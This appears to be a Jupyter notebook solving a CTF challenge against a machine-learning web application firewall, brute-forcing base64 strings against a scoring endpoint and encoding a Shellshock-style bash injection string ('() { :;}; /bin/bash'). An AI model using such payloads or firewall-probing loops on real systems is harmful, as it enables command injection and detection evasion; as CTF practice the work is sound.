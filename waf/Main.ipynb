{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2ae840f9",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import json\n",
    "import base64\n",
    "from urllib import parse"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "id": "593a5427",
   "metadata": {},
   "outputs": [],
   "source": [
    "chrs = ['+','-','=']\n",
    "for i in range(10):\n",
    "    chrs.append(chr(ord('0')+i))\n",
    "for i in range(26):\n",
    "    chrs.append(chr(ord('a')+i))\n",
    "for i in range(26):\n",
    "    chrs.append(chr(ord('A')+i))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b4d82487",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "aW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['aW4vY', 0.00779]]}\n",
      "iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['iaW4v', 0.00952]]}\n",
      "9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['9iaW4', 0.00849]]}\n",
      "C9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['C9iaW', 0.0105]]}\n",
      "IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['IC9ia', 0.00667]]}\n",
      "7IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['7IC9i', 0.00919]]}\n",
      "07IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['07IC9', 0.00958]]}\n",
      "307IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['307IC', 0.00997]]}\n",
      "O307IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['O307I', 0.01094]]}\n",
      "6O307IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['6O307', 0.01076]]}\n",
      "A6O307IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['A6O30', 0.00828]]}\n",
      "yA6O307IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['yA6O3', 0.00953]]}\n",
      "eyA6O307IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['eyA6O', 0.01017]]}\n",
      "geyA6O307IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['geyA6', 0.00802]]}\n",
      "kgeyA6O307IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['kgeyA', 0.00986]]}\n",
      "CkgeyA6O307IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['Ckgey', 0.00889]]}\n",
      "KCkgeyA6O307IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['KCkge', 0.0081]]}\n",
      "=KCkgeyA6O307IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['=KCkg', 0.01127]]}\n",
      "v=KCkgeyA6O307IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['v=KCk', 0.00767]]}\n",
      "nv=KCkgeyA6O307IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['nv=KC', 0.00792]]}\n",
      "env=KCkgeyA6O307IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['env=K', 0.00704]]}\n",
      "denv=KCkgeyA6O307IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['denv=', 0.00821]]}\n",
      "ddenv=KCkgeyA6O307IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['ddenv', 0.00952]]}\n",
      "addenv=KCkgeyA6O307IC9iaW4vYmFzaC== {'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['adden', 0.01012]]}\n"
     ]
    }
   ],
   "source": [
    "ans = 'W4vYmFzaC=='\n",
    "for i in range(100):\n",
    "    for ch in chrs:\n",
    "        input = ch + ans\n",
    "        \n",
    "        input = input[:9]\n",
    "\n",
    "        data = json.dumps(\n",
    "            {\"input\": input}\n",
    "        )\n",
    "\n",
    "        score = requests.post(\n",
    "            \"https://waf.fly.dev/score\", \n",
    "            data=data\n",
    "        )\n",
    "        mp = score.json()\n",
    "        if 'error' not in mp.keys() and 'SAFE' not in mp['waf']:\n",
    "            ans = ch + ans\n",
    "            print(ans, mp)\n",
    "            break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "36963f56",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "85c47dc1",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "YmFza\n",
      "{'waf': 'MALICIOUS REQUEST CAUGHT BY WAF', 'output': [['YmFza', 0.0087]]}\n"
     ]
    }
   ],
   "source": [
    "input = base64.b64encode(b'/bin/bash () { :;}; ').decode()\n",
    "\n",
    "data = json.dumps(\n",
    "    {\"input\": input}\n",
    ")\n",
    "\n",
    "try:\n",
    "    r = requests.post(\"https://waf.fly.dev/score\", data=data)\n",
    "    print(r.text)\n",
    "except requests.exceptions.ConnectionError:\n",
    "    print(\"Connection problems. Contact the CTF organizers.\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "9fcd1465",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'bash'"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "base64.b64decode('YmFzaD==')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.7.11 ('vqa_prompt')",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.11"
  },
  "vscode": {
   "interpreter": {
    "hash": "68422e507f07ae003e753ecc3427da05851b679f5b2d7ea3fdff1978b72e60d8"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
